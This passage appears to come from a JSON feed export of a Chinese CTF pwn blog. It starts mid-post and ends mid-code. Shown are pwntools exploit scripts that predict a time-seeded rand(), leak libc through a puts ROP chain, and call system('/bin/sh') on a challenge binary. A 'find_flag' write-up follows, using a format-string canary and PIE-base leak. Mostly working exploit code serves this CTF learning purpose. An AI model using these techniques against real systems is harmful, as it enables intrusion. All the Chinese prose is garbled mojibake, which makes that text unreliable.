remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401443</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x040125D</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># v6 = (libc.rand(b)-1) %100 +2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># p.sendafter(b'number:\\n',p32(v6))</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.27.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>‰ΩÜÊòØÊàëÊú¨Âú∞ÁöÑ libc ‰∏ãËΩΩÊù•ÔºåËøòÊòØÊâì‰∏çÈÄöÔºåÁúüÁöÑ‰∏çÁü•ÈÅìÂïäÂïäÂïäÂïäÂïäÂïä</p>\n<p>ËÉΩÊâìÈÄöÊú¨Âú∞ÁöÑ exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x401443</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>addr_system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>addr_binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>os: Êó©Áü•ÈÅì libcsearcher ËÉΩÊâìÈÄöÔºåË∞Å‰ºöÊéâÂ§¥ÂèëÔºÅÔºÅÔºÅÔºÅ</p>\n",
            "tags": [
                "pie",
                "gotÊîπÂÜô",
                "ÈöèÊú∫Êï∞Ê£ÄÊü•"
            ]
        },
        {
            "id": "http://example.com/2023/08/02/find-flag/",
            "url": "http://example.com/2023/08/02/find-flag/",
            "title": "find_flag",
            "date_published": "2023-08-02T10:44:10.000Z",
            "content_html": "<h1 id=\"È¢òÁõÆÂ§çÁé∞Ê∑±ËÇ≤ÊùØ-2021find_flag\"><a class=\"markdownIt-Anchor\" href=\"#È¢òÁõÆÂ§çÁé∞Ê∑±ËÇ≤ÊùØ-2021find_flag\">#</a> È¢òÁõÆÂ§çÁé∞ ‚Äî‚Äî[Ê∑±ËÇ≤ÊùØ 2021] find_flag</h1>\n<p>pie ‰∏é canary ÂêåÊó∂ÂºÄÂêØÔºåÂπ∂‰∏îÊúâÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤„ÄÇ</p>\n<h3 id=\"Ê£ÄÊü•Á®ãÂ∫è\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•Á®ãÂ∫è\">#</a> Ê£ÄÊü•Á®ãÂ∫èÔºö</h3>\n<p><img data-src=\"/img/find_flag/image-20230609204936112.png\" alt=\"image-20230609204936112\"></p>\n<p>‰øùÊä§ÂæàÂÖ®Èù¢„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609205227082.png\" alt=\"image-20230609205227082\"></p>\n<p>ÂèØ‰ª•ÁúãÁöÑÂá∫ÔºåÂú®Á¨¨‰∏ÄÂ§ÑÊúâÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û„ÄÇ</p>\n<h3 id=\"idaÂàÜÊûê\"><a class=\"markdownIt-Anchor\" href=\"#idaÂàÜÊûê\">#</a> IDA ÂàÜÊûêÔºö</h3>\n<p><img data-src=\"/img/find_flag/image-20230609205448884.png\" alt=\"image-20230609205448884\"></p>\n<p>Áúã‰∫Ü‰∏Ä‰∏ã mian ÂáΩÊï∞ÔºåÂ∞ÜÂáΩÊï∞ÈáçÂëΩÂêçÔºåpwn ÊòØÊàë‰ª¨ÊúâÊºèÊ¥ûÁöÑÂú∞Êñπ„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609205602697.png\" alt=\"image-20230609205602697\"></p>\n<p>ÂèØ‰ª•ÁúãÂà∞ gets ÂáΩÊï∞ÂèØ‰ª•ËøõË°åÊ†àÊ∫¢Âá∫Ôºå‰ΩÜÊòØÊúâ canary ‰øùÊä§ÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊ≥ÑÈú≤ canaryÔºåÂèØ‰ª•Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÂéªÊ≥ÑÈú≤ canary Âπ∂Ë¶ÜÂÜôÂú®Ê†à‰∏ä„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609205729803.png\" alt=\"image-20230609205729803\"></p>\n<p>ÂèëÁé∞ backdoor„ÄÇ‰ΩÜÊòØÂºÄ‰∫Ü pieÔºåÊàë‰ª¨Â∫îËØ•Êó†Ê≥ïÂà©Áî®Âêé‰ª¨Ôºå‰ΩÜÊòØÂ•ΩÂú®<strong>Âè™ËØªÂèòÈáèÔºàconst ‰øÆÈ•∞ÁöÑÔºâÂíåÂ≠óÁ¨¶‰∏≤ÂèòÈáè</strong>ÊîæÂÖ•<strong> rodata</strong> Âå∫„ÄÇËøòÊòØÂèØ‰ª•Âà©Áî®ÁöÑ„ÄÇ</p>\n<h3 id=\"gdbÂàÜÊûê\"><a class=\"markdownIt-Anchor\" href=\"#gdbÂàÜÊûê\">#</a> gdb ÂàÜÊûê:</h3>\n<p>ÊâìÊñ≠ÁÇπÂú® printf Â§ÑÔºà‰∏çÁü•Âà∞‰∏∫‰ªÄ‰πà‰∏çËÉΩÂú® main ÂáΩÊï∞Â§ÑÂ§ß‰∏ç‰∫ÜÊñ≠ÁÇπÔºåÂæàÂ•áÊÄ™</p>\n<p><img data-src=\"/img/find_flag/image-20230609210601700.png\" alt=\"image-20230609210601700\"></p>\n<p>‰∏ÄÁõ¥Ê≠•Âà∞‰∏ãÂõæÂ§Ñ</p>\n<p><img data-src=\"/img/find_flag/image-20230609210758887.png\" alt=\"image-20230609210758887\"></p>\n<p>ÁúãÊ†à‰ø°ÊÅØÔºåÂæàÊòéÊòæËÉΩÁúãÂà∞ canary‚Äî‚Äî&gt;</p>\n<blockquote>\n<p>0b:0058‚îÇ             0x7fffffffdd18 ‚óÇ‚Äî 0x121203e586d31600</p>\n</blockquote>\n<p><img data-src=\"/img/find_flag/image-20230609210832637.png\" alt=\"image-20230609210832637\"></p>\n<p>Áúã‰∏Ä‰∏ãË∑ùÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÂÅèÁßª„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609211002101.png\" alt=\"image-20230609211002101\"></p>\n<p>‰ΩÜÊòØÈöæÁÇπ‰∏çÊòØÂú®Ê≥ÑÈú≤ canaryÔºåËÄåÊòØÂú®Ê≥ÑÈú≤Âü∫ÂùÄ‰∏äÂéªÔºåÈúÄË¶Å‰∫ÜËß£ pie ÂíåÊ†àÔºåÂèØ‰ª•ÁúãÂà∞ÔºåÂú® rbp ‰∏ãÈù¢ÂàöÂ•ΩÊúâ‰∏Ä‰∏™Êàë‰ª¨ËÉΩÊ≥ÑÈú≤ÂáΩÊï∞Âü∫ÂùÄÔºå‰ΩÜÊòØ‰∏∫‰ªÄ‰πàÊòØ‰ªñÂë¢Ôºü</p>\n<p>ËÄÉËôëÂõ†‰∏∫Ëøô‰∏™Âú∞ÂùÄ‰ª£Ë°®‰∫ÜÊàë‰ª¨ÁöÑ main ÂáΩÊï∞ÁªìÂ∞æÁöÑ‰∏Ä‰∏™ÈÉ®ÂàÜÁöÑÂú∞ÂùÄÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∏™Âú∞ÂùÄËøõËÄåËÆ°ÁÆóÂá∫Ê†àÁöÑÂü∫ÂùÄ„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609211705133.png\" alt=\"image-20230609211705133\"></p>\n<p>Êé•‰∏ãÊù•Â∞±ÊòØÁ°ÆÂÆöÂÅèÁßª‰∫ÜÔºàÈ°ªÊ≥®ÊÑèÁöÑ‰∏ÄÁÇπÂ∞±ÊòØÈúÄË¶ÅÂú® gets ÂáΩÊï∞ËæìÂÖ•ÂêéÔºåÂú®Êü•ÁúãÊ†àÁöÑÊÉÖÂÜµÔºåËøôÊ†∑Êõ¥Â•ΩÁ°ÆÂÆö„ÄÇ</p>\n<p><img data-src=\"/img/find_flag/image-20230609211905134.png\" alt=\"image-20230609211905134\"></p>\n<h3 id=\"expÊûÑÈÄ†ÁéØËäÇ\"><a class=\"markdownIt-Anchor\" href=\"#expÊûÑÈÄ†ÁéØËäÇ\">#</a> exp ÊûÑÈÄ†ÁéØËäÇ:</h3>\n<p>Êó¢ÁÑ∂Êàë‰ª¨ÊâæÂà∞‰∫ÜÔºåÊàë‰ª¨Â∞±ÊûÑÈÄ† payload1 ÂéªÊ≥ÑÈú≤ canary ÂíåÂü∫ÂùÄ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>paylaod1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>Âú®ÊûÑÈÄ† rop ÈìæÁöÑÂáÜÂ§á„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span> <span class=\"token comment\"># robata ‰∏≠ÁöÑÂ≠óÁ¨¶‰∏≤</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr></table></figure><h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> expÔºö</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token 